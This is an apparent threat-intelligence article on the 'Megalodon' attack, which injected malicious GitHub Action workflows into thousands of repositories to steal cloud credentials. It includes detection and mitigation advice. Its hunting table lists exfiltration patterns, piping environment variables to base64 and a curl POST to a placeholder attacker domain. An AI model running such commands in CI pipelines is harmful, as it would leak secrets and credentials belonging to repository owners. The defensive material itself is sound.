# Massive 'Megalodon' Supply Chain Attack Compromises 5,500+ GitHub Repos to Steal Cloud Credentials

**Severity:** critical | **Category:** Supply Chain Attack,Cloud Security,Threat Actor | **Updated:** 2026-05-30 | **Reading time:** 6 min

A large-scale supply chain attack named 'Megalodon' has compromised over 5,500 GitHub repositories by injecting malicious GitHub Action workflows. The attack, attributed to the threat actor TeamPCP, occurred within a six-hour window and aimed to exfiltrate a wide range of cloud credentials (AWS, GCP, Azure), API tokens, and other secrets from the CI/CD environments of the infected projects. The Cybersecurity and Infrastructure Security Agency (CISA) has issued a warning, urging organizations to audit their software development pipelines.

## Executive Summary
A sophisticated and large-scale software **[supply chain attack](https://en.wikipedia.org/wiki/Software_supply_chain)**, dubbed **Megalodon**, has been uncovered, impacting more than 5,500 **[GitHub](https://github.com/)** repositories. The attack, attributed to a threat actor known as **TeamPCP**, involved injecting malicious code into GitHub Action workflows. The primary objective was the mass theft of sensitive credentials and secrets stored within continuous integration and continuous deployment (CI/CD) environments. This incident is part of a broader campaign that also included compromises of packages in the npm and PyPI ecosystems, highlighting a significant and ongoing threat to the software development lifecycle. The **[Cybersecurity and Infrastructure Security Agency (CISA)](https://www.cisa.gov)** has responded with a warning to organizations about compromises in software development pipelines.

---

## Threat Overview
The **Megalodon** attack took place on May 18, 2026, with attackers making over 5,700 malicious commits to thousands of public repositories in just six hours. The attack had two primary payloads delivered via malicious GitHub Action workflows:

1.  **Active Credential Theft:** A new malicious workflow was added to repositories, configured to trigger on every `push` and `pull_request` event. This workflow would then exfiltrate secrets and environment variables.
2.  **Dormant Backdoor:** Existing, legitimate workflows were replaced with malicious versions containing a dormant backdoor, which could be activated by the attackers at a later time.

The exfiltrated data was extensive, including CI environment variables, **[AWS](https://aws.amazon.com/)** credentials, **[GCP](https://cloud.google.com/)** access tokens, **[Azure](https://azure.microsoft.com/)** credentials, API tokens, and SSH keys. This attack was the second wave of a campaign; the first, named "Mini Shai-Hulud" (April 29 - May 12, 2026), was a self-propagating worm that compromised 172 packages on npm and PyPI.

---

## Technical Analysis
The attack is a classic example of CI/CD pipeline compromise, focusing on a weak link in the software supply chain: automated build processes.

### MITRE ATT&CK Techniques
- **[`T1195.001 - Compromise Software Dependencies and Development Tools`](https://attack.mitre.org/techniques/T1195/001/):** The core of the attack was compromising GitHub repositories and injecting malicious GitHub Actions, a key development tool.
- **[`T1078.001 - Default Credentials`](https://attack.mitre.org/techniques/T1078/001/):** The attackers likely gained initial access to the repositories by using compromised developer credentials or tokens, which may have been stolen in previous campaigns or leaked elsewhere.
- **[`T1552.005 - Cloud Credentials`](https://attack.mitre.org/techniques/T1552/005/):** The primary objective was to steal cloud credentials stored as secrets or environment variables within the GitHub Actions environment.
- **[`T1040 - Network Sniffing`](https://attack.mitre.org/techniques/T1040/):** While not sniffing in the traditional sense, the malicious workflow effectively 'sniffs' the CI/CD environment for any available secrets and exfiltrates them.
- **[`T1548.004 - Elevated Execution with Scheduled Job`](https://attack.mitre.org/techniques/T1548/004/):** The GitHub Action, which runs on events like `push`, acts as a scheduled job that executes the attacker's malicious code within the trusted context of the repository's runner.

---

## Impact Assessment
The **Megalodon** attack poses a severe risk to the software ecosystem. By compromising 5,500 repositories, the attackers have potentially gained access to the cloud environments of thousands of organizations and individual developers. This access could be used for cryptojacking, data theft, or as a launchpad for further, more targeted attacks. Furthermore, if any of these repositories are popular open-source projects, the malicious workflows could be forked and used by countless downstream users, propagating the compromise exponentially. The theft of API tokens and SSH keys could also lead to the compromise of other services beyond cloud providers, such as package registries, databases, and internal servers.

---

## IOCs — Directly from Articles

No specific file hashes or IP addresses were provided in the source articles. The primary indicator is the presence of unauthorized or modified GitHub Action workflow files.

---

## Cyber Observables — Hunting Hints

Security teams should hunt for the following patterns within their GitHub organizations:

| Type | Value | Description |
|---|---|---|
| `file_path` | `/.github/workflows/` | Monitor for unexpected or unauthorized commits that add or modify files in this directory. |
| `command_line_pattern` | `env | base64` | Look for workflow steps that pipe environment variables to encoding commands like `base64`, a common technique to obfuscate exfiltrated data. |
| `command_line_pattern` | `curl -X POST -d @- http://<attacker-domain>` | Search for workflow `run` commands that use `curl` or `wget` to send data to an external, non-standard domain. |
| `log_source` | `GitHub Audit Logs` | Audit for commits made by unknown or suspicious user accounts, especially if they modify workflow files across multiple repositories in a short time frame. |

---

## Detection & Response

1.  **Audit GitHub Actions:** Immediately conduct a thorough audit of all `.github/workflows/` files in all repositories. Look for any recently added or modified workflows, especially those committed by unfamiliar accounts or containing suspicious `run` steps.
2.  **Workflow Monitoring (D3-SFA):** Implement continuous monitoring of workflow files. Use tools or custom scripts to alert on any changes to these critical files and require a manual review before they are merged into main branches.
3.  **Credential Rotation:** If a repository is found to be compromised, assume all secrets and credentials associated with it are stolen. Immediately rotate all `GITHUB_TOKEN`s, cloud provider keys, API tokens, and any other secrets stored in GitHub Secrets for that repository.
4.  **Analyze Runner Logs:** Investigate the execution logs of GitHub Actions runners for any signs of compromise, such as unexpected network connections, file modifications, or command executions.

---

## Mitigation

Securing the CI/CD pipeline is critical to preventing such attacks.

1.  **Principle of Least Privilege (D3-UAP):** Configure GitHub Actions workflows with the minimum permissions necessary. Use the `permissions` key in the workflow file to restrict the default read/write permissions of the `GITHUB_TOKEN`.
2.  **Use OIDC for Cloud Authentication:** Instead of storing long-lived static credentials (e.g., AWS keys) in GitHub Secrets, switch to OpenID Connect (OIDC). This allows workflows to request short-lived access tokens directly from the cloud provider, eliminating the risk of stolen static secrets.
3.  **Require Workflow Approval:** For public repositories, enable the setting that requires approval from a maintainer for any pull request from a first-time contributor that modifies GitHub Actions workflows.
4.  **Pin Third-Party Actions:** When using third-party actions from the GitHub Marketplace, pin them to a specific commit hash (`user/action@commit-hash`) rather than a branch or tag (`user/action@v1`). This prevents the action from being maliciously updated without your knowledge.

**Tags:** supply chain, GitHub Actions, CI/CD, credential theft, open source, Megalodon, TeamPCP

## Sources
- [CISA urges security teams to check for software development compromises](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQEas58B-YPTKUlAErQGfxHH_rBjY3FpDa_NQ3zXeyORazvB4sS8211KjT0YQqYyI-O6qZ11iZ9NX_9ZqQeIZ4Y-Vh2tOpxG8BveCeFs1duORYUL1W_6_ckCrm5mxbX-h3rl3wkWIsgtn-bGf3TMtTLitz6rzVxvAhpOzpyVhMOndU2nAnHtuLmOQIS1vOkf6jV-lIGrK957cPxdV67Fukaw) — CISA (2026-05-29)
- [CISA urges security teams to check for software development compromises](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFozdbR1s-cx0fQzW5fiH5mNLejR3DqRPNfn5F-1zgQz6oKZF2Y_DfFPfD7XzU1jV799VGNTFOXN56Zn3R37hbsuR4h_HhKo4tD2QbXSBdyC9j_00u7eM_7cgdNcCycE05sTiY-GKRFu8q4BTMQJ9BHDjIOc5OExzERnpunGzmMMzAq0BfylcPqEpejugtxyORdyKNslb1pwEcw0whDKoM=) — CISA (2026-05-29)
- [Over 5,500 GitHub Repositories Infected in 'Megalodon' Supply Chain Attack - SecurityWeek](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQH-KMPocy6p8zv8ICBukiegNzuW8rHCaTYhT3trJ78eTqvs8ZFMAW5TP-Z9yCqfNGSdDrf_eFJgnxVo1QAd12utREDXD8trV_0AsgOFwyQ_8Ek-Zi4SEpg3GBFb-IJ1RmzarrT6K4OiNGkXfEdqAym0TqRYL222ic5aEBD7mgFsDCTvH4Y8tP67mMFw_keTkP_OQ9NMUEXj3vhEiZRVmEs=) — SecurityWeek (2026-05-25)
- [Shai-Hulud/Megalodon: A Two-Wave AI Developer Supply Chain Attack - Lab Space](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQERGDr7S3G8z-piTR_cgQ2dEWm7M67IgjTrOURq2z8jLQfOkAkMNDFW5vO152j4BkAUA7mwDeThvv404Qs6FXAq4pjHDRGnEFz6-Ys5HKc5ZMFl4hzUMO9Ps78hllHftSdbnqndokGZzQ5ap_KKoCLwWbaVeG0rrk8QfXtSmcW1wJCY2N4wbYoqenJePFbPf20zhfy4juplgFsPGNpxiGNDr_5JxBUF) — Lab Space (2026-05-22)
- [Megalodon cyberattack infects 5,500 GitHub repositories, report says | Mashable](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQHZ4-er4u6WnWc5xrcXHXe10QUsWICkaUMT1K5dV01b9jnUNQ_CYdsvLtsa6wjvDI0GCEXO3SrIfewW68jnBRYsxIKXSpu_FOoioLprSCIrXbU2WIovRr8uI4GA84txTDDxUThNq_Y304DIrLYqvNdjKauPgdgdIu8my68b0pwMi2CbtCUa) — Mashable (2026-05-25)
- [Megalodon: CI/CD Malware Spreading Across GitHub Repositories - OX Security](https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQEXUeFv0wvk6MkEGi3IAW3EBNspdkt8uq29V9mmTyk9u4jGGFzCKlHxN8n1wk2BiVGPgwQe9sIzc8xr4NmPb0Za_ktOueH-04t5Ev3g9v4d_6n63Kk7Buu1SreMR59V2KcxDAyjTGz8KdqPBKs0wCLsmskVAmc=) — OX Security (2026-05-21)

---
Source: https://cyber.netsecops.io/articles/megalodon-supply-chain-attack-compromises-over-5500-github-repositories/
